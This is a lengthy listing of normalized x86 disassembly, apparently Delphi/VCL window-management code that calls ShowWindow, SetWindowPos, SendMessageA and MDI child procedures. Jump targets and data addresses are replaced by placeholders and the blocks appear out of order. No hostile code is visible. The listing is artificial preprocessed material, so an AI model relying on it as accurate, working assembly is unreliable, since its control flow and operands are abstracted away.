mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211f5
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x213 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_42cdec
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_42272c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c2b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4226ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_41eb2c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
jmp r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_41eb2c
jmp r-xdata
sub_4210f1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4251dc
call sub_44c818
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41fb30
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430f60
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
mov ebx eax
call GetActiveWindow
cmp ebx eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211f5
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xfb
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
call sub_41a234
mov [ ebp - 0x10 ] eax
sub_42121c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_416770
test eax eax
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d294
sub_421260
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
sub_4212c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_4212dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42134e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_44c070
retn
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_42135c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x234 ] 0x2
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x210 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x3
jmp r-xdata
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4251c0
jmp r-xdata
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffb3
call sub_44c24c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_421544
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215fc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41ead0
jmp r-xdata
sub_42141c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x282 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41e1a4
dec eax
test eax eax
jl r-xdata
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e20c
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
je r-xdata
sub_42149c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42151b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x234 ] edx
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215fc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421574
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4215f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4215f7
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f9c8
sub_4215fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call PostMessageA
pop ecx
pop ebp
retn
sub_421620
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4218c3
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_42ac08
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x6c ]
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
xor edx edx
call sub_43c550
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x38 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_422dc0
mov eax [ rw-data ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_41a0b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4218a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_421558
xor eax eax
push ebp
push sub_4217f7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x234 ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x234 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42149c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_424ef8
mov eax [ rw-data ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x234 ]
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_434714
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4217fe
mov eax [ ebp - 0x4 ]
call sub_421544
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4217fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218ad
mov eax [ rw-data ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_422dc0
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_422dc0
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
call sub_43c444
mov edx [ rw-data ]
mov [ edx + 0x6c ] eax
mov eax [ rw-data ]
mov edx [ eax + 0x6c ]
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
call sub_43c728
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_41a168
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4218d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4218d4
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x41 ] 0x80
je r-xdata
sub_421954
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_4218d4
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov eax [ eax + 0x28 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x8 ]
call sub_409374
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
sub_4219e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42bad0
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4234b0
pop ecx
pop ebp
retn
sub_421a14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431ef0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x2f
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
sub_421a48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff4
call sub_44c24c
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_421a84
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421a48
pop ecx
test al al
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421a84
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_421b18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
call sub_421a48
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax [ ebp - 0x8 ]
call sub_421a48
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_421a84
pop ecx
test al al
je r-xdata
sub_421b78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff1
call sub_44c24c
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_421bb4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421b78
pop ecx
test al al
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421bb4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_421c48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
call sub_421b78
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax [ ebp - 0x8 ]
call sub_421b78
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_421bb4
pop ecx
test al al
je r-xdata
sub_421ca8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c8 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_404824
test al al
je r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_421d18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2aa ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push ebp
call sub_421ca8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov bx 0xfff0
call sub_44c24c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_421da4
push ebp
mov ebp esp
push ecx
push r-xdata
mov eax [ ebp + 0xc ]
push eax
call IsEqualGUID
test al al
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x238 ]
call sub_44e3e8
jmp r-xdata
push r-xdata
mov eax [ ebp + 0xc ]
push eax
call IsEqualGUID
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_442c9c
mov [ ebp - 0x4 ] eax
sub_421e70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ba44
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_41e010
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_432a04
mov dl 0x3
mov eax [ ebp - 0x4 ]
call sub_41e484
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_421ee8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421fd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43284c
dec eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43262c
